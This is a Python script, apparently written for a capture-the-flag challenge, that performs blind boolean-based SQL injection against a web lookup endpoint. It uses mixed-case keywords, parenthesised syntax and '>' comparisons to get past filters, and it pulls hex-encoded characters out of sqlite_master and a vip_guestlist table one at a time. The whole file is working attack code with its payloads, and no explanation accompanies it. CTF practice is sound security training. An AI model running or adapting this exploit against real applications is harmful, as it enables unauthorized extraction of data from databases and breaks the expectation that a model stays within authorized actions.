import requests
import time
import sys

TARGET_URL = "https://823965a9-0aed-4c10-98ac-c212a981fb72.offsec.m0lecon.it/check/lookup" 
PARAM_NAME = "code"
TRUE_CONDITION_TEXT = "reservation" 

# Ordered list of valid Hex characters
HEX_CHARS = "0123456789ABCDEF"

def check_boolean_oracle(payload):
    params = {PARAM_NAME: payload}
    try:
        response = requests.get(TARGET_URL, params=params)
        
        # Negative Oracle: If we see the failure message, the SQL query evaluated to False
        if "No reservation found" in response.text:
            return False
            
        # If we DON'T see the failure message, our SQL query evaluated to True!
        return True
        
    except requests.exceptions.RequestException:
        return False

def extract_tables_with_greater_than():
    print("[*] Starting extraction bypassing '=' with '>' and '<'...")
    extracted_hex = ""
    extracted_text = ""
    position = 1
    
    while True:
        # We will build the 2-character hex byte (e.g., '72') one character at a time
        hex_byte = ""
        
        # We know HEX outputs 2 characters per letter, so we loop twice
        for hex_char_pos in [1, 2]:
            char_found = False
            
            # Iterate through our hex characters
            for i in range(len(HEX_CHARS)):
                guess = HEX_CHARS[i]
                
                # Payload: Is the specific character of the HEX string greater than our guess?
                # e.g., SUBSTR(HEX(SUBSTR(name, 1, 1)), 1, 1) > '6'
                #payload = f"(0)oR((SeLECT(SUBSTR(HEX(SUBSTR(GROUP_CONCAT(name),{position},1)),{hex_char_pos},1))FrOM(sqlite_master)WHeRE(type)='table')>'{guess}')"
                #payload = f"(0)oR((SeLECT(SUBSTR(HEX(SUBSTR(sql,{position},1)),{hex_char_pos},1))FrOM(sqlite_master)WHeRE(name)='vip_guestlist')>'{guess}')"
                payload = f"(0)oR((SeLECT(SUBSTR(HEX(SUBSTR(GROUP_CONCAT(access_note),{position},1)),{hex_char_pos},1))FrOM(vip_guestlist))>'{guess}')"

                is_greater = check_boolean_oracle(payload)
                #time.sleep(0.1) # Small delay to avoid 429 Too Many Requests
                
                if not is_greater:
                    # If it's NOT greater than our guess, and it was greater than the previous guess,
                    # then it MUST be our current guess!
                    hex_byte += guess
                    char_found = True
                    break
            
            if not char_found:
                # If we hit the end of the string, SUBSTR returns NULL, which breaks the > logic.
                print(f"\n[*] Extraction complete.")
                print(f"[+] Final Decoded Text: {extracted_text}")
                return

        extracted_hex += hex_byte
        
        try:
            # Decode the 2-character hex byte to a string
            last_char = bytes.fromhex(hex_byte).decode('utf-8')
            extracted_text += last_char
            sys.stdout.write(last_char)
            sys.stdout.flush()
        except ValueError:
            pass
            
        position += 1

if __name__ == "__main__":
    extract_tables_with_greater_than()